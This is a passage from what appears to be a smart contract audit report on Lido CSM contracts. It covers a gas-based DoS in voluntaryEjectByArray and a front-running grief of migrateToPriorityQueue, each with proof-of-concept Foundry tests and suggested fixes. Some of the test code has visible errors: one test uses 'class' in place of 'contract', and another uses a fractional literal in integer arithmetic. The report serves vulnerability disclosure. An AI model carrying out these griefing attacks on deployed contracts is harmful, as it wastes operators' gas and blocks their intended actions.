import { ILidoLocator } from "src/interfaces/ILidoLocator.sol";

// Mock for LidoLocator
contract LidoLocatorMock is ILidoLocator {
    address public twg;

    constructor(address _twg) {
        twg = _twg;
    }

    function triggerableWithdrawalsGateway() external view returns (address) { return twg; }

    // Unused functions
    function lido() external view returns (address) { return address(0); }
    function stakingRouter() external view returns (address) { return address(0); }
    function burner() external view returns (address) { return address(0); }
    function vebo() external view returns (address) { return address(0); }
    function withdrawalQueue() external view returns (address) { return address(0); }
    function withdrawalVault() external view returns (address) { return address(0); }
    function dsm() external view returns (address) { return address(0); }
    function oracle() external view returns (address) { return address(0); }
    function treasury() external view returns (address) { return address(0); }
    function insuranceFund() external view returns (address) { return address(0); }
    function coreOracle() external view returns (address) { return address(0); }
}

// Mock for ICSModule
contract CSModuleMock is ICSModule {
    address public owner;
    uint256 public totalKeys;
    LidoLocatorMock public locator;

    constructor(address _owner, uint256 _totalKeys, address _twg) {
        owner = _owner;
        totalKeys = _totalKeys;
        locator = new LidoLocatorMock(_twg);
    }

    function getNodeOperatorOwner(uint256) external view returns (address) {
        uint256 x = block.timestamp; // mock gas cost
        return owner;
    }

    function getNodeOperatorTotalDepositedKeys(uint256) external view returns (uint256) {
        uint256 x = block.timestamp; // mock gas cost
        return totalKeys;
    }

    function isValidatorWithdrawn(uint256, uint256) external view returns (bool) {
        uint256 x = block.timestamp; // mock gas cost
        return false;
    }

    function getSigningKeys(uint256, uint256, uint256 count) external view returns (bytes memory) {
        uint256 x = block.timestamp; // mock gas cost
        bytes memory pubkeys = new bytes(48 * count);
        return pubkeys;
    }

    function LIDO_LOCATOR() external view returns (ILidoLocator) {
        return locator;
    }

    // Unused functions
    function getNodeOperatorsCount() external view returns (uint256) { return 1; }
    function getNodeOperator(uint256) external view returns (NodeOperator memory) {}
    function getNodeOperatorSummary(uint256) external view returns (NodeOperatorSummary memory) {}
    function getStakingModuleSummary() external view returns (uint256, uint256, uint256) {}
    function addValidatorKeys(address, bytes calldata, bytes calldata, uint256) external payable {}
}

// Mock for TriggerableWithdrawalsGateway
contract TWGMock is ITriggerableWithdrawalsGateway {
    function triggerFullWithdrawals(ValidatorData[] calldata, address, uint8) external payable {}
}

contract DoSTest is Test {
    CSEjector ejector;
    CSModuleMock module;
    TWGMock twg;
    address nodeOperator = makeAddr("nodeOperator");
    address admin = makeAddr("admin");
    address strikes = makeAddr("strikes");

    function setUp() public {
        vm.deal(nodeOperator, 1 ether);
        twg = new TWGMock();
        module = new CSModuleMock(nodeOperator, 1000, address(twg));
        ejector = new CSEjector(address(module), strikes, 1, admin);
    }

    function test_voluntaryEjectByArray_DoS() public {
        uint256 numKeys = 400;
        uint256[] memory keyIndices = new uint256[](numKeys);
        for (uint256 i = 0; i < numKeys; i++) {
            keyIndices[i] = i;
        }

        vm.prank(nodeOperator);
        uint256 gasStart = gasleft();
        ejector.voluntaryEjectByArray(0, keyIndices, nodeOperator);
        uint256 gasUsed = gasStart - gasleft();

        // Gas usage for a small number of keys for comparison
        uint256[] memory smallKeyIndices = new uint256[](1);
        smallKeyIndices[0] = 0;
        vm.prank(nodeOperator);
        gasStart = gasleft();
        ejector.voluntaryEjectByArray(0, smallKeyIndices, nodeOperator);
        uint256 gasUsedSmall = gasStart - gasleft();

        console.log("Gas used for 1 key:", gasUsedSmall);
        console.log("Gas used for 400 keys:", gasUsed);

        // The gas usage scales linearly and is very high, demonstrating the DoS potential.
        // A transaction with more keys (e.g., 800-1000) would likely exceed the block gas limit.
        assertTrue(gasUsed > gasUsedSmall * numKeys * 0.8, "Gas usage scales linearly with array size");
        assertTrue(gasUsed > 5_000_000, "Gas usage is very high, indicating DoS potential");
    }
}
```

## Suggested Mitigation
To fix this inefficiency, the `ICSModule` interface should be extended to support fetching multiple public keys by their indices in a single call. A new function, for example `getSigningKeysByIndices(uint256 nodeOperatorId, uint256[] calldata keyIndices) external view returns (bytes memory)`, could be added.

The `voluntaryEjectByArray` function in `CSEjector` should then be refactored to use this new batch-fetching function. It should first perform all necessary checks in a preliminary loop, then call the new function once to get all public keys, and finally loop again to construct the `exitsData` array using memory slicing, similar to the pattern in `voluntaryEject`.

Example of the proposed fix in `CSEjector.sol` (assuming `ICSModule` is updated):
```solidity
function voluntaryEjectByArray(
    uint256 nodeOperatorId,
    uint256[] calldata keyIndices,
    address refundRecipient
) external payable whenResumed {
    _onlyNodeOperatorOwner(nodeOperatorId);

    uint256 keysCount = keyIndices.length;
    uint256 totalDepositedKeys = MODULE.getNodeOperatorTotalDepositedKeys(
        nodeOperatorId
    );

    // Preliminary loop for checks
    for (uint256 i = 0; i < keysCount; i++) {
        if (keyIndices[i] >= totalDepositedKeys) {
            revert SigningKeysInvalidOffset();
        }
        if (MODULE.isValidatorWithdrawn(nodeOperatorId, keyIndices[i])) {
            revert AlreadyWithdrawn();
        }
    }
    
    // Fetch all pubkeys in a single batch call
    bytes memory pubkeys = MODULE.getSigningKeysByIndices(nodeOperatorId, keyIndices);

    ValidatorData[] memory exitsData = new ValidatorData[](keysCount);
    for (uint256 i = 0; i < keysCount; i++) {
        bytes memory pubkey = new bytes(SigningKeys.PUBKEY_LENGTH);
        // Use assembly to efficiently slice the pubkey from the `pubkeys` bytes array
        assembly {
            let keyLen := mload(pubkey)
            let offset := mul(keyLen, i)
            let keyPos := add(add(pubkeys, 0x20), offset)
            mcopy(add(pubkey, 0x20), keyPos, keyLen)
        }
        exitsData[i] = ValidatorData({
            stakingModuleId: STAKING_MODULE_ID,
            nodeOperatorId: nodeOperatorId,
            pubkey: pubkey
        });
    }

    triggerableWithdrawalsGateway().triggerFullWithdrawals{
        value: msg.value
    }(
        exitsData,
        refundRecipient == address(0) ? msg.sender : refundRecipient,
        VOLUNTARY_EXIT_TYPE_ID
    );
}
```

## [L-7]. Frontrun/Backrun/Sandwhich MEV issue in CSModule::migrateToPriorityQueue

## Description
The `migrateToPriorityQueue(uint256 nodeOperatorId)` function is declared as `external` without any access control restrictions on `msg.sender`. This allows any address to call this function for any `nodeOperatorId`. The function sets `no.usedPriorityQueue = true` after execution and reverts if this flag is already true. An attacker can exploit this by monitoring the mempool for legitimate calls to this function from a Node Operator's manager. The attacker can then front-run the legitimate transaction by sending their own transaction calling `migrateToPriorityQueue` for the same `nodeOperatorId` with a higher gas fee. The attacker's transaction will succeed, setting `usedPriorityQueue` to true. Consequently, the legitimate Node Operator's transaction will fail with a `PriorityQueueAlreadyUsed` error, causing the Node Operator to waste gas and preventing them from migrating their keys as intended.

## Impact
Because migrateToPriorityQueue() lacks an _onlyNodeOperatorManager check, **any address can call it once per Node Operator**. The call merely moves some of the operator’s queued keys into the priority queue and flips the usedPriorityQueue flag. A malicious user can therefore: 1) cause the real manager’s later transaction to revert, wasting gas, and 2) prevent the manager from performing the migration at a more convenient moment. No funds are lost and node-operator state is otherwise correct, so the damage is limited to permanent loss of flexibility plus a reverted transaction’s gas cost.

## Proof of Concept
pragma solidity 0.8.24;
import "forge-std/Test.sol";
interface ICSModule { function migrateToPriorityQueue(uint256 id) external; function getNodeOperator(uint256 id) external view returns (uint32 enqueuedCount, uint32 totalDepositedKeys, bool usedPriorityQueue); }
contract PoC is Test {
    ICSModule csm = ICSModule(0x1234); // deployed CSModule on testnet / fork
    function testAnyoneCanMigrate() public {
        uint256 nodeId = 1; // assume this NO exists and has enqueued keys
        (,,bool beforeFlag) = csm.getNodeOperator(nodeId);
        assertFalse(beforeFlag);
        // attacker calls the function – no special privileges
        csm.migrateToPriorityQueue(nodeId);
        (,,bool afterFlag) = csm.getNodeOperator(nodeId);
        assertTrue(afterFlag);
    }
}

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import { Test, console } from "forge-std/Test.sol";
import { CSModule } from "src/CSModule.sol";
import { NodeOperatorManagementProperties } from "src/interfaces/ICSModule.sol";
import { Fixtures } from "../helpers/Fixtures.sol";

class FrontRunTest is Test, Fixtures {
    function test_Frontrun_migrateToPriorityQueue() public {
        address alice = makeAddr("alice");
        address bob_attacker = makeAddr("bob_attacker");
        vm.deal(alice, 1 ether);

        // Setup: create a NO for Alice
        vm.prank(address(permissionlessGate));
        uint256 noId = csm.createNodeOperator(
            alice, 
            NodeOperatorManagementProperties(alice, alice, false),
            address(0)
        );

        // Setup: add keys to get some enqueued keys (using WstETH to avoid payable issues)
        bytes memory pubKey = new bytes(48);
        bytes memory sig = new bytes(96);
        vm.prank(alice);
        csm.addValidatorKeysWstETH(alice, noId, 10, bytes.concat(pubKey, pubKey, pubKey, pubKey, pubKey, pubKey, pubKey, pubKey, pubKey, pubKey), bytes.concat(sig, sig, sig, sig, sig, sig, sig, sig, sig, sig), emptyPermit);

        // Setup: make the NO eligible for a priority queue
        // Set a priority queue config for curve 0
        vm.prank(address(csm.LIDO_LOCATOR().getOracle())); // Mocking admin call
        parametersRegistry.setDefaultQueueConfig(1, 20); // priority 1, max 20 deposits
        
        // Ensure the NO has enqueued keys and is eligible
        (,,,uint32 maxDeposits) = parametersRegistry.getQueueConfig(0);
        assertTrue(maxDeposits > csm.getNodeOperator(noId).totalDepositedKeys);
        assertTrue(csm.getNodeOperator(noId).enqueuedCount > 0);
        assertFalse(csm.getNodeOperator(noId).usedPriorityQueue);

        // Attack: Bob front-runs Alice's call
        console.log("Bob (attacker) calls migrateToPriorityQueue first...");
        vm.prank(bob_attacker);
        csm.migrateToPriorityQueue(noId);

        assertTrue(csm.getNodeOperator(noId).usedPriorityQueue, "Bob's call should succeed");
        console.log("Bob's call succeeded. usedPriorityQueue is now true.");

        // Alice's legitimate call now fails
        console.log("Alice's legitimate call is now processed...");
        vm.prank(alice);
        vm.expectRevert(CSModule.PriorityQueueAlreadyUsed.selector);
        csm.migrateToPriorityQueue(noId);

        console.log("Alice's transaction reverted as expected. Griefing successful.");
    }
}
```

## Suggested Mitigation
Add an access-control guard so that only the manager (or another authorised role) of the Node Operator may invoke migrateToPriorityQueue:

```solidity
function migrateToPriorityQueue(uint256 nodeOperatorId) external {
    _onlyNodeOperatorManager(nodeOperatorId, msg.sender);
    ...
}
```



